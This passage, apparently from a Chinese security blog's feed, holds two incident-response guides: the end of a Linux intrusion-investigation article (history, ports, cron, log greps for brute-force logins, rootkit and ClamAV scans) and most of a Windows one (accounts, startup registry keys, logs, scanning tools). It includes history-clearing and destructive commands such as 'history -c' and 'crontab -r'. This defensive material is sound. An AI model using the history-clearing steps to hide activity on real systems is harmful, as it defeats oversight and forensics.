-r user    将删除 user 用户，并且将 /home 目录下的 user 目录一并删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-历史命令"><a href="#1-2-历史命令" class="headerlink" title="1.2 历史命令"></a>1.2 历史命令</h4><p><strong>基本使用：</strong></p><p>通过 .bash_history 文件查看帐号执行过的系统命令</p><pre class="line-numbers language-none"><code class="language-none">1、root 用户的历史命令histroy2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。为历史的命令增加登录的 IP 地址、执行命令时间等信息：1）保存1万条命令sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile2）在/etc/profile的文件尾部添加如下行数配置信息：######jiagu history xianshi#########USER_IP=`who -u am i 2&gt;/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'`if [ "$USER_IP" = "" ]thenUSER_IP=`hostname`fiexport HISTTIMEFORMAT="%F %T $USER_IP `whoami` "shopt -s histappendexport PROMPT_COMMAND="history -a"######### jiagu history xianshi ##########3）source /etc/profile 让配置生效生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile3、历史操作命令的清除：history -c但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>入侵排查：</strong></p><pre class="line-numbers language-none"><code class="language-none">进入用户目录下，导出历史命令。cat .bash_history &gt;&gt; history.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="1-3-检查异常端口"><a href="#1-3-检查异常端口" class="headerlink" title="1.3 检查异常端口"></a>1.3 检查异常端口</h4><p>使用 netstat 网络连接命令，分析可疑端口、IP、PID</p><pre class="line-numbers language-none"><code class="language-none">netstat -antlp | more查看下 pid 所对应的进程文件路径，运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-4-检查异常进程"><a href="#1-4-检查异常进程" class="headerlink" title="1.4 检查异常进程"></a>1.4 检查异常进程</h4><p>使用 ps 命令，分析进程</p><pre class="line-numbers language-none"><code class="language-none">ps aux | grep pid <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-5-检查开机启动项"><a href="#1-5-检查开机启动项" class="headerlink" title="1.5 检查开机启动项"></a>1.5 检查开机启动项</h4><p><strong>基本使用：</strong></p><p>系统运行级别示意图：</p><table><thead><tr><th align="center">运行级别</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">关机</td></tr><tr><td align="center">1</td><td align="center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td></tr><tr><td align="center">2</td><td align="center">不完全的命令行模式，不含NFS服务</td></tr><tr><td align="center">3</td><td align="center">完全的命令行模式，就是标准字符界面</td></tr><tr><td align="center">4</td><td align="center">系统保留</td></tr><tr><td align="center">5</td><td align="center">图形模式</td></tr><tr><td align="center">6</td><td align="center">重启动</td></tr></tbody></table><p>查看运行级别命令 <code>runlevel</code></p><p>系统默认允许级别</p><pre><code>vi  /etc/inittabid=3：initdefault  #系统开机后直接进入哪个运行级别</code></pre><p>开机启动配置文件</p><pre><code>/etc/rc.local/etc/rc.d/rc[0~6].d</code></pre><p>例子：当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 /etc/init.d 目录下，然后在 /etc/rc.d/rc*.d 文件中建立软链接即可。</p><p>注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级</p><pre><code>root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</code></pre><p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p><p><strong>入侵排查：</strong></p><p>启动项文件：</p><pre class="line-numbers language-none"><code class="language-none">more /etc/rc.local/etc/rc.d/rc[0~6].dls -l /etc/rc.d/rc3.d/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-6-检查定时任务"><a href="#1-6-检查定时任务" class="headerlink" title="1.6 检查定时任务"></a>1.6 检查定时任务</h4><p><strong>基本使用</strong></p><p>1、利用 crontab 创建计划任务</p><ul><li><p>基本命令</p><pre class="line-numbers language-none"><code class="language-none">crontab -l   列出某个用户cron服务的详细内容Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/rootcrontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)crontab -e   使用编辑器编辑当前的crontab文件 如：*/1 * * * * echo "hello world" &gt;&gt; /tmp/test.txt 每分钟写入文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>2、利用 anacron 命令实现异步定时任务调度</p><ul><li><p>使用案例</p><pre class="line-numbers language-none"><code class="language-none">每天运行 /home/backup.sh 脚本：vi /etc/anacrontab @daily    10    example.daily   /bin/bash /home/backup.sh当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p><strong>入侵排查</strong></p><p>重点关注以下目录中是否存在恶意脚本</p><pre><code>/var/spool/cron/* /etc/crontab/etc/cron.d/*/etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/*</code></pre><p>小技巧：</p><pre><code>more /etc/cron.daily/*  查看目录下所有文件</code></pre><h4 id="1-7-检查服务"><a href="#1-7-检查服务" class="headerlink" title="1.7 检查服务"></a>1.7 检查服务</h4><p><strong>服务自启动</strong></p><p>第一种修改方法：</p><pre><code>chkconfig [--level 运行级别] [独立服务名] [on|off]chkconfig –level  2345 httpd on  开启自启动chkconfig httpd on （默认level是2345）</code></pre><p>第二种修改方法：</p><pre><code>修改 /etc/re.d/rc.local 文件  加入 /etc/init.d/httpd start</code></pre><p>第三种修改方法：</p><p>使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。</p><p><strong>入侵排查</strong></p><p>1、查询已安装的服务：</p><p>RPM 包安装的服务</p><pre><code>chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务ps aux | grep crond 查看当前服务系统在3与5级别下的启动项 中文环境chkconfig --list | grep "3:启用\|5:启用"英文环境chkconfig --list | grep "3:on\|5:on"</code></pre><p>源码包安装的服务</p><pre><code>查看服务安装位置 ，一般是在/user/local/service httpd start搜索/etc/rc.d/init.d/  查看是否存在</code></pre><h4 id="1-8-检查异常文件"><a href="#1-8-检查异常文件" class="headerlink" title="1.8 检查异常文件"></a>1.8 检查异常文件</h4><p>1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</p><p>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>​    可以使用find命令来查找，如  find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件</p><p>3、针对可疑文件可以使用 stat 进行创建修改时间。</p><h4 id="1-9-检查系统日志"><a href="#1-9-检查系统日志" class="headerlink" title="1.9 检查系统日志"></a>1.9 检查系统日志</h4><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">记录了系统定时任务相关的日志</td></tr><tr><td align="center">/var/log/cups</td><td align="center">记录打印信息的日志</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td align="center">/var/log/mailog</td><td align="center">记录邮件信息</td></tr><tr><td align="center">/var/log/message</td><td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td align="center">/var/log/secure</td><td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>日志分析技巧：</p><pre class="line-numbers language-none"><code class="language-none">1、定位有多少IP在爆破主机的root帐号：    grep "Failed password for root" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more定位有哪些IP在爆破：grep "Failed password" /var/log/secure|grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"|uniq -c爆破用户名字典是什么？grep "Failed password" /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print "$1\n";}'|uniq -c|sort -nr 2、登录成功的IP有哪些： grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more登录成功的日期、用户名、IP：grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3、增加一个用户kali日志：Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bashJul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali#grep "useradd" /var/log/secure 4、删除用户kali日志：Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali'Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali'Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali'# grep "userdel" /var/log/secure5、su切换用户：Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)sudo授权执行:sudo -lJul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-Rootkit查杀"><a href="#2-1-Rootkit查杀" class="headerlink" title="2.1 Rootkit查杀"></a>2.1 Rootkit查杀</h4><ul><li><p>chkrootkit  </p><p>网址：<a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a> </p><pre class="line-numbers language-none"><code class="language-none">使用方法：wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gztar zxvf chkrootkit.tar.gzcd chkrootkit-0.52make sense#编译完成没有报错的话执行检查./chkrootkit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>rkhunter</p><p>网址：<a href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a></p><pre class="line-numbers language-none"><code class="language-none">使用方法：Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gztar -zxvf rkhunter-1.4.4.tar.gzcd rkhunter-1.4.4./installer.sh --installrkhunter -c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><ul><li><p>Clamav</p><p>网址：<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a> </p><p>安装方式一： </p><pre class="line-numbers language-none"><code class="language-none">1、安装 zlib：wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz tar -zxvf  zlib-1.2.7.tar.gzcd zlib-1.2.7#安装一下gcc编译环境： yum install gccCFLAGS="-O3 -fPIC" ./configure --prefix= /usr/local/zlib/make &amp;&amp; make install2、添加用户组 clamav 和组成员 clamav：groupadd clamavuseradd -g clamav -s /bin/false -c "Clam AntiVirus" clamav3、安装 Clamavtar –zxvf clamav-0.97.6.tar.gzcd clamav-0.97.6./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlibmakemake install4、配置 Clamavmkdir /opt/clamav/logsmkdir /opt/clamav/updatatouch /opt/clamav/logs/freshclam.logtouch /opt/clamav/logs/clamd.logcd /opt/clamav/logschown clamav:clamav clamd.logchown clamav:clamav freshclam.log5、ClamAV 使用： /opt/clamav/bin/freshclam 升级病毒库./clamscan –h 查看相应的帮助信息./clamscan -r /home  扫描所有用户的主目录就使用./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装方式二： </p><pre class="line-numbers language-none"><code class="language-none">#安装yum install -y clamav#更新病毒库freshclam#扫描方法clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.logclamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.logclamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log#扫描并杀毒clamscan -r  --remove  /usr/bin/bsd-portclamscan -r  --remove  /usr/bin/clamscan -r --remove  /usr/local/zabbix/sbin#查看日志发现cat /root/usrclamav.log |grep FOUND<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="2-3-webshell查杀"><a href="#2-3-webshell查杀" class="headerlink" title="2.3 webshell查杀"></a>2.3 webshell查杀</h4><p>Linux 版：</p><pre class="line-numbers language-none"><code class="language-none">河马 WebShell 查杀：http://www.shellpub.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-4-RPM-check-检查"><a href="#2-4-RPM-check-检查" class="headerlink" title="2.4 RPM check 检查"></a>2.4 RPM check 检查</h4><p>系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p><pre class="line-numbers language-none"><code class="language-none">./rpm -Va &gt; rpm.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p><pre class="line-numbers language-none"><code class="language-none">验证内容中的8个信息的具体内容如下：S         文件大小是否改变M         文件的类型或文件的权限（rwx）是否被改变5         文件MD5校验是否改变（可以看成文件内容是否改变）D         设备中，从代码是否改变L         文件路径是否改变U         文件的属主（所有者）是否改变G         文件的属组是否改变T         文件的修改时间是否改变<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果命令被替换了，如果还原回来：</p><pre class="line-numbers language-none"><code class="language-none">文件提取还原案例：rpm  -qf /bin/ls  查询 ls 命令属于哪个软件包mv  /bin/ls /tmp  先把 ls 转移到 tmp 目录下，造成 ls 命令丢失的假象rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 ls 命令到当前目录的 /bin/ls 下cp /root/bin/ls  /bin/ 把 ls 命令复制到 /bin/ 目录 修复文件丢失<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-5-Linux安全检查脚本"><a href="#2-5-Linux安全检查脚本" class="headerlink" title="2.5 Linux安全检查脚本"></a>2.5 Linux安全检查脚本</h4><p>Github 项目地址：</p><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><p><a href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></p><p><a href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p><p><strong>尽信书不如无书，工具只是辅助，别太过于依赖，关键在于你如何解决问题的思路。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="入侵排查篇" scheme="http://www.xiaocaibi.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/"/>
    
  </entry>
  
  <entry>
    <title>第1篇：Windows 入侵排查</title>
    <link href="http://www.xiaocaibi.top/posts/c4440d4e.html"/>
    <id>http://www.xiaocaibi.top/posts/c4440d4e.html</id>
    <published>2021-07-14T01:04:15.000Z</published>
    <updated>2021-09-20T08:47:43.807Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第1篇：windows-入侵排查"><a href="#第1篇：windows-入侵排查" class="headerlink" title="第1篇：windows 入侵排查"></a>第1篇：windows 入侵排查</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>常见的应急响应事件分类：</p><p>Web 入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Windows 服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="1-1-检查系统账号安全"><a href="#1-1-检查系统账号安全" class="headerlink" title="1.1 检查系统账号安全"></a>1.1 检查系统账号安全</h4><p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</p><ul><li>检查方法：据实际情况咨询相关服务器管理员。</li></ul><p>2、查看服务器是否存在可疑账号、新增账号。</p><ul><li>检查方法：打开 cmd 窗口，输入 <code>lusrmgr.msc</code> 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。 </li></ul><p>3、查看服务器是否存在隐藏账号、克隆账号。</p><ul><li><p>检查方法：</p><p>a、打开注册表 ，查看管理员对应键值。</p><p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/sum-1-1.png"></p><p>4、结合日志，查看管理员登录时间、用户名是否存在异常。</p><ul><li><p>检查方法：</p><p>a、Win+R 打开运行，输入”eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>b、导出 Windows 日志 – 安全，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/sum-1-4.png">)</p><h4 id="1-2-检查异常端口、进程"><a href="#1-2-检查异常端口、进程" class="headerlink" title="1.2 检查异常端口、进程"></a>1.2 检查异常端口、进程</h4><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><ul><li><p>检查方法：</p><p>a、使用<code>netstat -ano</code> 命令查看目前的网络连接，定位可疑的 ESTABLISHED </p><p>b、根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 <code>tasklist  | findstr "PID"</code></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/sum-1-3.png"></p><p>2、进程</p><ul><li><p>检查方法：</p><p>a、开始 – 运行 – 输入 <code>msinfo32</code> 命令，依次点击 “软件环境 – 正在运行任务” 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。</p><p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p><p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p><p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p><pre><code>  没有签名验证信息的进程  没有描述信息的进程  进程的属主  进程的路径是否合法  CPU 或内存资源占用长时间过高的进程</code></pre></li></ul><p>3、小技巧：</p><p>​    a、查看端口对应的 PID：<code>netstat -ano | findstr "port"</code></p><p>​    b、查看进程对应的 PID：任务管理器 – 查看 – 选择列 – PID 或者 <code>tasklist  | findstr "PID"</code></p><p>​    c、查看进程对应的程序位置：</p><p>​        任务管理器 – 选择对应进程 – 右键打开文件位置</p><p>​        运行输入 <code>wmic</code>，cmd 界面输入 <code>process</code></p><p>​    d、<code>tasklist /svc</code>   进程 – PID – 服务</p><p>​    e、查看Windows服务所对应的端口：</p><p>​        %systemroot%/system32/drivers/etc/services（一般 %systemroot% 就是 C:\Windows 路径）</p><h4 id="1-3-检查启动项、计划任务、服务"><a href="#1-3-检查启动项、计划任务、服务" class="headerlink" title="1.3 检查启动项、计划任务、服务"></a>1.3 检查启动项、计划任务、服务</h4><p>1、检查服务器是否有异常的启动项。</p><ul><li><p>检查方法：</p><p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。<br>b、单击开始菜单 &gt;【运行】，输入 <code>msconfig</code>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。<br>c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p><pre class="line-numbers language-none"><code class="language-none">  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunHKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p>d、利用安全软件查看启动项、开机时间管理等。</p><p>e、组策略，运行 <code>gpedit.msc</code></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/sum-1-4.png"></p><p>2、检查计划任务</p><ul><li><p>检查方法：</p><p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p><p>b、单击【开始】&gt;【运行】；输入 <code>cmd</code>，然后输入 <code>at</code>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p></li></ul><p>3、服务自启动</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务。</li></ul><h4 id="1-4-检查系统相关信息"><a href="#1-4-检查系统相关信息" class="headerlink" title="1.4 检查系统相关信息"></a>1.4 检查系统相关信息</h4><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>systeminfo</code>，查看系统信息。</li></ul><p>2、查找可疑目录及文件</p><ul><li><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><pre class="line-numbers language-none"><code class="language-none">Window 2003版本 C:\Documents and Settings  Window 2008R2及以后版本 C:\Users\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>b、单击【开始】&gt;【运行】，输入 <code>%UserProfile%\Recent</code>，分析最近打开分析可疑文件。</p><p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d、回收站、浏览器下载目录、浏览器历史记录</p><p>e、修改时间在创建时间之前的为可疑文件</p></li></ul><p>3、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>a、利用 <a href="http://www.torchsoft.com/en/rw_information.html">Registry Workshop</a> 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。<br>b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p><h4 id="1-5-自动化查杀"><a href="#1-5-自动化查杀" class="headerlink" title="1.5 自动化查杀"></a>1.5 自动化查杀</h4><ul><li><p>病毒查杀</p><ul><li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li></ul></li><li><p>webshell查杀</p><ul><li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款 WebShell 查杀工具同时查杀，可相互补充规则库的不足。</li></ul></li></ul><h4 id="1-6-日志分析"><a href="#1-6-日志分析" class="headerlink" title="1.6 日志分析"></a>1.6 日志分析</h4><p>系统日志</p><ul><li><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>b、Win+R 打开运行，输入 “eventvwr.msc”，回车运行，打开”事件查看器”。</p><p>C、导出应用程序日志、安全日志、系统日志，利用 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p>Web 访问日志</p><ul><li><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。</p></li></ul><h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-病毒分析"><a href="#2-1-病毒分析" class="headerlink" title="2.1 病毒分析"></a>2.1 病毒分析</h4><p>PCHunter：<a href="http://www.xuetr.com/">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p><h4 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a>   （推荐理由：绿色版、最新病毒库）</p><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free%EF%BC%88%E6%8E%A8%E8%8D%90%E7%90%86%E7%94%B1%EF%BC%9A%E6%89%AB%E6%8F%8F%E5%BF%AB%E3%80%81%E4%B8%80%E6%AC%A1%E4%B8%8B%E8%BD%BD%E5%8F%AA%E8%83%BD%E7%94%A81%E5%91%A8%EF%BC%8C%E6%9B%B4%E6%96%B0%E7%97%85%E6%AF%92%E5%BA%93%EF%BC%89">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p><p>火绒安全软件：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>360杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p><h4 id="2-3-病毒动态"><a href="#2-3-病毒动态" class="headerlink" title="2.3 病毒动态"></a>2.3 病毒动态</h4><p>CVERC-国家计算机病毒应急处理中心：<a 